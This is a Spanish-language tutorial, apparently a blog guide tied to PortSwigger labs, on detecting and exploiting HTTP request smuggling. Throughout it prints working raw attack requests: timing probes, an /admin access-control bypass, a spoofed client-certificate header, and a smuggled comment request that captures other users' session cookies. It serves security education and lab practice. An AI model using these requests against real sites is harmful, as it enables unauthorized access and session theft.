---
title: HTTP Request Smuggling Guide
description: Guía sobre HTTP Request Smuggling
date: 2026-04-22 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Guides
tags:
  - Portswigger Guides
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

`Explicación técnica de la vulnerabilidad HTTP request smuggling`. Detallamos cómo `identificar` y `explotar` esta `vulnerabilidade`. Además, exploramos `estrategias clave para prevenirla`

---

## ¿Qué es HTTP request smuggling?

`HTTP request smuggling` es una `técnica` para `interferir con la forma en la que un sitio web procesa secuencias de solicitudes HTTP que son recibidas de uno o más usuarios`. Las `vulnerabilidades de request smuggling` suelen ser de `naturaleza crítica`, permitiendo a un atacante `eludir controles de seguridad, obtener acceso no autorizado a datos sensibles` y `comprometer directamente a otros usuarios de la aplicación`

El `request smuggling` está `asociado principalmente con solicitudes HTTP/1`. Sin embargo, los `sitios web` que `admiten HTTP/2` también `pueden ser vulnerables`, dependiendo de su `arquitectura de back-end`

El `HTTP request smuggling` fue `documentado por primera vez en 2005` y `volvió a popularizarse gracias a la extensa investigación de PortSwigger sobre el tema`. Para más `información` podemos `leer` los siguientes `artículo`:

- HTTP desync attacks: Request smuggling reborn [https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

- HTTP/2: The sequel is always worse [https://portswigger.net/research/http2](https://portswigger.net/research/http2)

- Browser-powered desync attacks: A new frontier in HTTP request smuggling [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)

## ¿Qué ocurre en un ataque de HTTP request smuggling?

Las `aplicaciones web actuales` emplean con frecuencia `cadenas de servidores HTTP` entre los `usuarios` y la `lógica final de la aplicación`. Los `usuarios` envían `solicitudes` a un `servidor front-end` (a veces denominado `balanceador de carga` o `reverse proxy`) y este `servidor` reenvía las `solicitudes` a uno o más `servidores back-end`. Este `tipo de arquitectura` es cada vez más `común` y, en algunos casos, `inevitable en las aplicaciones modernas basadas en la nube`

Cuando el `servidor front-end` reenvía `solicitudes HTTP` a un `servidor back-end`, normalmente `envía varias solicitudes a través de la misma conexión de red hacia el back-end`, ya que esto es `mucho más eficiente` y `ofrece un mejor rendimiento`. El `protocolo` es muy `simple`, las `solicitudes HTTP` se `envían una tras otra`, y el `servidor receptor` debe `determinar dónde termina una solicitud y dónde comienza la siguiente`

![](/assets/img/HTTP-Request-Smuggling-Guide/image_1.png)

En esta `situación`, es `crucial` que los `sistemas front-end y back-end` estén de acuerdo sobre los `límites entre las solicitudes`. De lo contrario, un `atacante` podría ser capaz de `enviar una solicitud ambigua que sea interpretada de manera diferente por los sistemas front-end y back-end`

![](/assets/img/HTTP-Request-Smuggling-Guide/image_2.png)

Aquí, el `atacante` consigue que `parte de su solicitud enviada al front-end sea interpretada por el servidor back-end como el inicio de la siguiente solicitud`. En la práctica, esta `parte se antepone a la siguiente solicitud` y, por tanto, puede `interferir con la forma en que la aplicación procesa dicha solicitud`. Esto es un `request smuggling attack` y puede tener `consecuencias devastadoras`

## ¿Cómo surgen las vulnerabilidades de HTTP request smuggling?

La mayoría de las `vulnerabilidades de HTTP request smuggling` surgen porque la `especificación HTTP/1` proporciona `dos formas diferentes de indicar dónde termina una solicitud`, la cabecera `Content-Length` y la cabecera `Transfer-Encoding`

La cabecera `Content-Length` es `sencilla`: `especifica la longitud del cuerpo del mensaje en bytes`. Por ejemplo:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

La cabecera `Transfer-Encoding` puede utilizarse para `indicar que el body del mensaje usa codificación fragmentada (chunked encoding)`. Esto significa que el `body del mensaje` contiene `uno o más fragmentos de datos`. Cada `fragmento` consiste en el `tamaño del fragmento en bytes` (expresado en `hexadecimal`), seguido de una `nueva línea` y, a continuación, el `contenido del fragmento`. El `mensaje` termina con un `fragmento de tamaño cero`. Por ejemplo:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

Muchos `testers de seguridad` desconocen que la `codificación fragmentada (chunked encoding)` puede utilizarse en `solicitudes HTTP` por `dos razones`:

- `Burpsuite` desempaqueta automáticamente la `codificación fragmentada` para que los `mensajes` sean `más fáciles de visualizar y editar`

- Los `navegadores` normalmente `no utilizan codificación fragmentada en las solicitudes`, y normalmente solo se `observa en las respuestas de los servidores`

Como la `especificación HTTP/1` proporciona `dos métodos diferentes para especificar la longitud de los mensajes HTTP`, es posible que un `único mensaje` utilice `ambos métodos al mismo tiempo`, de forma que `entren en conflicto entre sí`. La `especificación` intenta `evitar este problema` indicando que, si están presentes tanto las cabeceras `Content-Length` como `Transfer-Encoding`, entonces debe ignorarse la cabecera `Content-Length`. Esto puede ser `suficiente para evitar ambigüedades cuando solo interviene un servidor`, pero no cuando `dos o más servidores están encadenados`. En esta `situación`, pueden `surgir problemas` por `dos motivos`:

- Algunos `servidores` no admiten la cabecera `Transfer-Encoding` en las `solicitudes`

- Algunos `servidores` que sí admiten la cabecera `Transfer-Encoding` pueden ser `inducidos a no procesarla si la cabecera está ofuscada de alguna manera`

Si los `servidores front-end y back-end` se `comportan de forma diferente` respecto a la cabecera `Transfer-Encoding` (posiblemente ofuscada), entonces podrían `no estar de acuerdo sobre los límites entre solicitudes sucesivas`, dando lugar a `vulnerabilidades de request smuggling`

Los `sitios web` que `utilizan HTTP/2 de extremo a extremo` son `inherentemente inmunes a los ataques de request smuggling`. Como la `especificación HTTP/2` introduce un `único mecanismo robusto para especificar la longitud de una solicitud`, no existe ninguna forma de que un `atacante` introduzca la `ambigüedad necesaria`

Sin embargo, muchos `sitios web` tienen un `servidor front-end` que `habla HTTP/2`, pero lo despliegan delante de una `infraestructura back-end` que `solo admite HTTP/1`. Esto significa que el `front-end` tiene que `traducir efectivamente las solicitudes que recibe a HTTP/1`. Este `proceso` se conoce como `HTTP downgrading`

## Encontrar vulnerabilidades de HTTP request smuggling mediante técnicas de temporización

La `forma más eficaz de detectar vulnerabilidades de HTTP request smuggling` consiste en `enviar solicitudes que provoquen un retraso en las respuestas de la aplicación si la vulnerabilidad está presente`. Esta `técnica` es utilizada por el `escáner de Burpsuite` para `automatizar la detección de vulnerabilidades de request smuggling`

### Encontrar vulnerabilidades CL.TE mediante técnicas de temporización

Si una `aplicación` es `vulnerable a la variante CL.TE de HTTP request smuggling`, enviar una `solicitud` como la siguiente suele `provocar un retraso en el tiempo de respuesta`:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

Como el `servidor front-end` utiliza la cabecera `Content-Length`, solo `reenviará una parte de esta solicitud`, omitiendo la `X`. El `servidor back-end` utiliza la cabecera `Transfer-Encoding`, procesa el `primer chunk` y a continuación `espera a que llegue el siguiente chunk`. Esto provoca un `retraso observable en la respuesta`

### Encontrar vulnerabilidades TE.CL mediante técnicas de temporización

Si una `aplicación` es `vulnerable a la variante TE.CL de HTTP request smuggling`, enviar una `solicitud` como la siguiente suele `provocar un retraso en el tiempo de respuesta`:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Como el `servidor front-end` utiliza la cabecera `Transfer-Encoding`, solo `reenviará una parte de esta solicitud`, omitiendo la `X`. El `servidor back-end` utiliza la cabecera `Content-Length`, por lo que `espera recibir más contenido en el cuerpo de la solicitud` y `permanece esperando a que llegue el contenido restante`. Esto provoca un `retraso observable en la respuesta`

Este tipo de `tests basados en temporización para detectar vulnerabilidades TE.CL` pueden `interrumpir a otros usuarios de la aplicación si esta es vulnerable a la variante CL.TE`. Por ello, para `actuar de forma discreta` y `minimizar las interrupciones`, primero debemos `realizar la prueba CL.TE` y continuar con la `prueba TE.CL` únicamente si la `primera no tiene éxito`

## Confirmar vulnerabilidades de HTTP request smuggling mediante respuestas diferenciales

Cuando se ha `detectado una posible vulnerabilidad de HTTP request smuggling`, es posible `obtener más evidencias explotándola para provocar diferencias en el contenido de las respuestas de la aplicación`. Esto implica `enviar dos solicitudes a la aplicación en rápida sucesión`:

- Una solicitud de `ataque`, diseñada para `interferir con el procesamiento de la siguiente solicitud`

- Una solicitud `normal`

Si la `respuesta a la solicitud normal` contiene la `interferencia esperada`, la `vulnerabilidad queda confirmada`. Por ejemplo, supongamos que la `solicitud normal` tiene el siguiente aspecto:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Esta `solicitud` normalmente recibe una `respuesta HTTP` con el código de estado `200`, que contiene algunos `resultados de búsqueda`. La `solicitud de ataque` necesaria para `interferir con esta solicitud` depende si nos encontramos ante un HTTP request smuggling `CL.TE` o `TE.CL`

### Confirmar vulnerabilidades CL.TE mediante respuestas diferenciales

Para `confirmar una vulnerabilidad CL.TE`, tenemos que `enviar una solicitud de ataque` como la siguiente:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Si el `ataque tiene éxito`, las `dos últimas líneas de esta solicitud` serán tratadas por el `servidor back-end` como si `pertenecieran a la siguiente solicitud que reciba`. Esto hará que la siguiente solicitud `normal` tenga el siguiente aspecto:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- HTTP request smuggling, confirming a CL.TE vulnerability via differential responses - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-1/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-1)

### Confirmar vulnerabilidades TE.CL mediante respuestas diferenciales

Para `confirmar una vulnerabilidad TE.CL`, enviamos una `solicitud de ataque` como la siguiente:

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```

Para `enviar esta solicitud` utilizando el `Repeater`, primero debemos `asegurarnos` de que la opción `Update Content-Length` esté `desactivada` y también debemos incluir la secuencia final `\r\n\r\n` después del último `0`. También es importante que la `secuencia x=` tiene un `espacio`, por lo que es `x=espacio`

Si el `ataque tiene éxito`, todo lo que aparece a partir de `GET /404` será tratado por el `servidor back-end` como si `perteneciera a la siguiente solicitud que reciba`. Esto hará que la siguiente solicitud `normal` tenga el siguiente aspecto:

```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Como esta `solicitud` ahora contiene una `URL no válida`, el `servidor` responderá con un código de estado `404`, lo que indica que la `solicitud de ataque` efectivamente `interfirió con la solicitud normal`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- HTTP request smuggling, confirming a TE.CL vulnerability via differential responses - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-2/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-2/)

Al intentar `confirmar vulnerabilidades de HTTP request smuggling mediante la interferencia con otras solicitudes`, deben tenerse en cuenta varias `consideraciones importantes`:

- La solicitud de `ataque` y la solicitud `normal` deben `enviarse al servidor utilizando conexiones de red diferentes`. `Enviar ambas solicitudes a través de la misma conexión no demuestra que la vulnerabilidad exista`

- La solicitud de `ataque` y la solicitud `normal` deben utilizar, en la medida de lo posible, la `misma URL` y los `mismos nombres de parámetros`. Esto se debe a que muchas `aplicaciones modernas` enrutan las solicitudes del `front-end` a diferentes `servidores back-end` en función de la `URL` y los `parámetros`. `Utilizar la misma URL y los mismos parámetros` aumenta la probabilidad de que ambas solicitudes sean procesadas por el mismo `servidor back-end`, lo cual es `esencial para que el ataque funcione`

- Al comprobar si la solicitud `normal` ha sido `afectada` por la solicitud de `ataque`, estaremos `compitiendo con cualquier otra solicitud que la aplicación esté recibiendo al mismo tiempo`, incluidas las de `otros usuarios`. Debemos enviar la solicitud `normal` inmediatamente después de la solicitud de `ataque`. Si la aplicación está muy ocupada, puede que necesitemos `realizar varios intentos para confirmar la vulnerabilidad`

- En algunas `aplicaciones`, el `servidor front-end` actúa como un `balanceador de carga` y reenvía las solicitudes a distintos sistemas `back-end` según algún `algoritmo de balanceo`. Si nuestra solicitud de `ataque` y nuestra solicitud `normal` son reenviadas a distintos sistemas `back-end`, el `ataque fallará`. Esta es otra razón por la que puede ser necesario `realizar varios intentos antes de poder confirmar la vulnerabilidad`

- Si nuestro `ataque` consigue `interferir con una solicitud posterior`, pero esa no era la solicitud `normal` que enviamos  para `detectar la interferencia`, significa que `otro usuario de la aplicación se ha visto afectado por nuestro ataque`. Si continuamos realizando la prueba, podríamos `provocar interrupciones a otros usuarios`, por lo que debemos `actuar con precaución`

## ¿Cómo realizar un ataque de HTTP request smuggling?

Los `ataques clásicos` de `HTTP request smuggling` consisten en incluir tanto la cabecera `Content-Length` como la cabecera `Transfer-Encoding` en una única solicitud `HTTP/1` y manipularlas para que los servidores `front-end` y `back-end` procesen la solicitud de `forma diferente`. La `forma exacta de hacerlo` depende del `comportamiento de ambos servidores`:

- `CL.TE` - El `servidor front-end` utiliza la cabecera `Content-Length` y el `servidor back-end` utiliza la cabecera `Transfer-Encoding`
  
- `TE.CL` - El `servidor front-end` utiliza la cabecera `Transfer-Encoding` y el `servidor back-end` utiliza la cabecera `Content-Length`

- `TE.TE` - Tanto el `servidor front-end` como el `servidor back-end` admiten la cabecera `Transfer-Encoding`, pero es posible `inducir a uno de ellos a que no la procese ofuscando la cabecera de alguna forma`

Estas `técnicas` solo son posibles utilizando solicitudes `HTTP/1`. Los `navegadores y otros clientes`, incluido `Burpsuite`, utilizan `HTTP/2` de forma predeterminada para `comunicarse con los servidores que anuncian explícitamente su compatibilidad con este protocolo` durante el `TLS handshake`

Como resultado, al probar sitios que admiten `HTTP/2`, es necesario `cambiar manualmente el protocolo` en `Burp Repeater`. Puedes hacerlo desde la sección `Request attributes` del panel `Inspector`

### Vulnerabilidades CL.TE 

Aquí, el `servidor front-end` utiliza la cabecera `Content-Length` y el `servidor back-end` utiliza la cabecera `Transfer-Encoding`. Podemos realizar un `ataque simple de HTTP request smuggling` de la siguiente manera:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

El `servidor front-end` procesa la cabecera `Content-Length` y determina que el `cuerpo de la solicitud` tiene una `longitud de 13 bytes`, hasta el final de `SMUGGLED`. Esta `solicitud se reenvía al servidor back-end`. El `servidor back-end` procesa la cabecera `Transfer-Encoding` y, por tanto, interpreta que el `cuerpo del mensaje` utiliza `codificación fragmentada (chunked encoding)`. Procesa el `primer fragmento`, que indica una `longitud de cero`, por lo que se considera que la `solicitud termina en ese punto`. Los bytes siguientes, `SMUGGLED`, quedan sin procesar y el `servidor back-end` los tratará como el `comienzo de la siguiente solicitud de la secuencia`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- HTTP request smuggling, basic CL.TE vulnerability - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-3/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-3/)

### Vulnerabilidades TE.CL

Aquí, el `servidor front-end` utiliza la cabecera `Transfer-Encoding` y el `servidor back-end` utiliza la cabecera `Content-Length`. Podemos realizar un `ataque simple de HTTP request smuggling` de la siguiente manera:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Para `enviar esta solicitud` usando el `Repeater`, primero debemos ir al `menú de Repeater` y `asegurarnos` de que la opción `Update Content-Length` está `desmarcada`. También debemos incluir la secuencia final `\r\n\r\n` después del `0` final

El `servidor front-end` procesa la cabecera `Transfer-Encoding` y, por tanto, interpreta el `cuerpo del mensaje` como `codificación fragmentada (chunked encoding)`. Procesa el `primer fragmento`, que se indica que tiene `8 bytes de longitud`, hasta el inicio de la línea que sigue a `SMUGGLED`. Procesa el `segundo fragmento`, que se indica que tiene `longitud cero`, y por tanto se considera que `termina la solicitud`. Esta `solicitud se reenvía al servidor back-end`

El `servidor back-end` procesa la cabecera `Content-Length` y determina que el `cuerpo de la solicitud` tiene una `longitud de 3 bytes`, hasta el inicio de la línea que sigue a `8`. Los bytes siguientes, comenzando por `SMUGGLED`, se dejan sin procesar, y el `servidor back-end` los tratará como el `inicio de la siguiente solicitud en la secuencia`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- HTTP request smuggling, basic TE.CL vulnerability - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-4/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-4/)

### Comportamiento TE.TE: Ofuscar la cabecera Transfer-Encoding

En este caso, tanto el `servidor front-end` como el `servidor back-end` admiten la cabecera `Transfer-Encoding`, pero es posible `inducir a uno de los dos servidores a que no la procese ofuscando la cabecera de alguna forma`

Existen `prácticamente infinitas formas` de ofuscar la cabecera `Transfer-Encoding`. Por ejemplo:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Cada una de estas `técnicas` implica una `sutil desviación de la especificación HTTP`. El `código del mundo real que implementa una especificación de protocolo rara vez la sigue con absoluta precisión`, y es habitual que `distintas implementaciones toleren diferentes variaciones de la especificación`. Para descubrir una vulnerabilidad `TE.TE`, es necesario encontrar alguna variación de la cabecera `Transfer-Encoding` que haga que solo uno de los servidores, el `front-end` o el `back-end`, la procese, mientras que `el otro la ignore`

Dependiendo de si es el `servidor front-end` o el `servidor back-end` el que puede ser inducido a no procesar la cabecera `Transfer-Encoding` ofuscada, el `resto del ataque seguirá el mismo procedimiento` que en las vulnerabilidades `CL.TE` o `TE.CL` descritas anteriormente

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- HTTP request smuggling, obfuscating the TE header - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-5/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-5)

## Explotar vulnerabilidades de HTTP Request Smuggling

En esta sección, describiremos `varias formas en las que las vulnerabilidades de HTTP Request Smuggling pueden explotarse`, dependiendo de la `funcionalidad prevista` y de otros `comportamientos de la aplicación`.

### Uso de HTTP Request Smuggling para bypassear los controles de seguridad del servidor front-end

En algunas `aplicaciones`, el `servidor web front-end` se utiliza para `implementar ciertos controles de seguridad`, decidiendo si se `permite que cada solicitud individual sea procesada`. Las `solicitudes permitidas` se reenvían al `servidor back-end`, donde se considera que ya han `superado los controles del front-end`

Por ejemplo, supongamos que una `aplicación` utiliza el `servidor front-end` para `implementar restricciones de control de acceso`, reenviando `solicitudes únicamente si el usuario está autorizado para acceder a la URL solicitada`. El `servidor back-end`, entonces, `acepta todas las solicitudes sin realizar comprobaciones adicionales`. En esta `situación`, una `vulnerabilidad de HTTP Request Smuggling` puede utilizarse para `eludir los controles de acceso`, introduciendo de forma smuggleada una `solicitud dirigida a una URL restringida`

Supongamos que el `usuario actual` tiene permiso para acceder a `/home`, pero no a `/admin`. Puede `eludir esta restricción` utilizando el siguiente `ataque de HTTP Request Smuggling`:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

El `servidor front-end` interpreta que aquí hay `dos solicitudes`, ambas dirigidas a `/home`, por lo que las reenvía al `servidor back-end`. Sin embargo, el `servidor back-end` interpreta que hay una solicitud para `/home` y otra para `/admin`. Como asume que las `solicitudes ya han pasado los controles del front-end`, `concede acceso a la URL restringida`

En estos `laboratorios` podemos ver como `aplicar` esta `técnica`:

- Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-6/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-6)

- Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-7/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-7)

### Revelando la reescritura de solicitudes del front-end

En muchas `aplicaciones`, el `servidor front-end` realiza `cierta reescritura de las solicitudes` antes de que sean reenviadas al `servidor back-end`, normalmente `añadiendo algunas cabeceras adicionales`. 

Esto se produce porque el `front-end (proxy, load balancer, WAF, CDN...)` tiene una `configuración propia`, y parte de su trabajo es `enriquecer la petición con info que el back-end necesita pero que el cliente no puede o no debe proporcionar directamente`

Por ejemplo, el `servidor front-end` podría:

- `Terminar la conexión TLS` y `añadir algunas cabeceras que describan el protocolo y los cifrados que se utilizaron`

- Añadir una cabecera `X-Forwarded-For` que contenga la `dirección IP del usuario`

- `Determinar el ID del usuario basándose en su token de sesión` y `añadir una cabecera que identifique al usuario`

- Añadir `información sensible que sea de interés para otros ataques`

En algunas situaciones, si nuestras `solicitudes smuggleadas` no incluyen algunas `cabeceras que normalmente son añadidas por el servidor front-end`, entonces el `servidor back-end` podría `no procesar las solicitudes de la forma habitual`, lo que provocaría que las `solicitudes smuggleadas no produjeran los efectos esperados`

A menudo existe una `forma sencilla de revelar exactamente cómo el servidor front-end está reescribiendo las solicitudes`. Para ello, debemos realizar los siguientes `pasos`:

- `Encontrar una solicitud POST que refleje el valor de un parámetro de la solicitud en la respuesta de la aplicación`

- `Reordenar los parámetros para que el parámetro reflejado aparezca el último en el body del mensaje`

- `Smugglear esta petición hacia el servidor back-end`, seguida directamente por una `solicitud normal cuya forma reescrita queramos revelar`

Supongamos que una `aplicación` tiene una `función de inicio de sesión que refleja el valor del parámetro email`:

```
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

Esto da como resultado una `respuesta que contiene lo siguiente`:

```
<input id="email" value="wiener@normal-user.net" type="text">
```

Aquí podemos utilizar el siguiente `ataque de request smuggling` para `revelar la reescritura que realiza el servidor front-end`:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

Las `solicitudes serán reescritas por el servidor front-end` para incluir las `cabeceras adicionales`, y después el `servidor back-end` procesará la `solicitud smuggleada` y `tratará la segunda solicitud reescrita como si fuera el valor del parámetro email`. A continuación, `reflejará este valor de vuelta en la respuesta a la segunda solicitud`:

```
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

Dado que la `solicitud final está siendo reescrita`, no sabemos cuál será su `longitud final`. El valor de la cabecera `Content-Length` en la `solicitud smuggleada` determinará cuál será la `longitud que el servidor back-end creerá que tiene la solicitud`. Si establecemos este valor `demasiado bajo`, solo recibiremos una `parte de la solicitud reescrita` y si lo establecemos `demasiado alto`, el `servidor back-end` agotará el `tiempo de espera mientras espera a que la solicitud se complete`. Por supuesto, la `solución` consiste en `elegir un valor inicial que sea un poco mayor que la solicitud enviada` e `ir aumentando gradualmente ese valor para obtener más información`, hasta que `recuperemos todo lo que nos interesa`

Una vez hayamos `descubierto cómo el servidor front-end está reescribiendo las solicitudes`, podremos `aplicar las reescrituras necesarias a nuestras solicitudes smuggleadas`, para asegurarnos de que sean `procesadas de la forma prevista por el servidor back-end`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Exploiting HTTP request smuggling to reveal front-end request rewriting - [https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-8/](https://justice-reaper.github.io/posts/HTTP-Request-Smuggling-Lab-8)

### Bypassear la autenticación del cliente

Como parte del `handshake TLS`, los `servidores` se `autentican ante el cliente` (normalmente un `navegador`) proporcionando un `certificado`. Este `certificado` contiene su `common name (CN)`, que debe `coincidir con su nombre de host registrado`. El `cliente` puede utilizar esta información para `verificar que realmente se está comunicando con un servidor legítimo que pertenece al dominio esperado`

Algunos `sitios web` van un paso más allá e `implementan una forma de autenticación mutua mediante TLS`, en la que los `clientes también deben presentar un certificado al servidor`. En este caso, el `CN del cliente` suele ser un `nombre de usuario` o algo similar, que puede utilizarse en la `lógica de la aplicación del back-end` como parte de un `mecanismo de control de acceso`, por ejemplo

El `componente que autentica al cliente` normalmente `pasa los detalles relevantes del certificado a la aplicación o al servidor back-end` mediante una o varias `cabeceras HTTP no estándar`. Por ejemplo, los `servidores front-end` a veces `añaden una cabecera que contiene el CN del cliente a todas las solicitudes entrantes`:

```
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

Como se supone que estas `cabeceras permanecen completamente ocultas para los usuarios`, los `servidores back-end` suelen `confiar implícitamente en ellas`. Suponiendo que podamos `enviar la combinación correcta de cabeceras y valores`, esto puede permitirnos `eludir los controles de acceso`

En la práctica, este comportamiento normalmente `no es explotable` porque los `servidores front-end` tienden a `sobrescribir estas cabeceras si ya están presentes`. Sin embargo, las `solicitudes smuggleadas` permanecen ocultas para el `servidor front-end`, por lo que `cualquier cabecera que contengan será enviada al servidor back-end sin modificaciones`

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

### Capturar las solicitudes de otros usuarios

Si la `aplicación` contiene algún tipo de `funcionalidad que nos permita almacenar y posteriormente recuperar datos de texto`, podemos utilizarla potencialmente para `capturar el contenido de las solicitudes de otros usuarios`. Estas pueden incluir `tokens de sesión` u otros `datos sensibles enviados por el usuario`. Las `funciones adecuadas para utilizar como vehículo de este ataque` serían los `comentarios`, los `correos electrónicos`, las `descripciones de perfil`, los `nombres de usuario`, etc

Para `llevar a cabo el ataque`, debemos `smugglear una solicitud que envíe datos a la función de almacenamiento`, colocando el `parámetro que contiene los datos que se van a almacenar al final de la solicitud`. Por ejemplo, supongamos que una `aplicación` utiliza la siguiente solicitud para `enviar un comentario en una entrada del blog`, que será `almacenado y mostrado en el blog`:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

¿Que pasaria si `smuggleamos una solicitud equivalente` pero `proporcionamos un valor más alto en la cabecera Content-Lengh` y el `parámetro comment` lo `posicionamos al final de la solicitud`? Por ejemplo:

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

La cabecera `Content-Length` de la `solicitud smuggleada` indica que el `cuerpo tendrá una longitud de 400 bytes`, pero solo hemos `enviado 144 bytes`. En este caso, el `servidor back-end` esperará los `256 bytes restantes` antes de `emitir la respuesta`, o generará un `timeout si estos no llegan con la suficiente rapidez`. Como resultado, cuando otra `solicitud sea enviada al servidor back-end a través de la misma conexión`, los `primeros 256 bytes` quedarán efectivamente `anexados a la solicitud smuggleada de la siguiente manera`:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
...
```

Como el `inicio de la solicitud de la víctima está contenido dentro del parámetro comment`, este será `publicado como un comentario en el blog`, permitiéndonos `leerlo simplemente visitando el post correspondiente`

Para `capturar una mayor parte de la solicitud de la víctima`, solo tenemos que `aumentar el valor de la cabecera Content-Length de la solicitud smuggleada`, aunque debemos tener en cuenta que esto `implicará cierta cantidad de prueba y error`. Si como respuesta vemos un `timeout`, probablemente significa que el `valor de Content-Length que hemos especificado es superior a la longitud real de la solicitud de la víctima`. En ese caso, simplemente tenemos que `reducir el valor hasta que el ataque vuelva a funcionar`

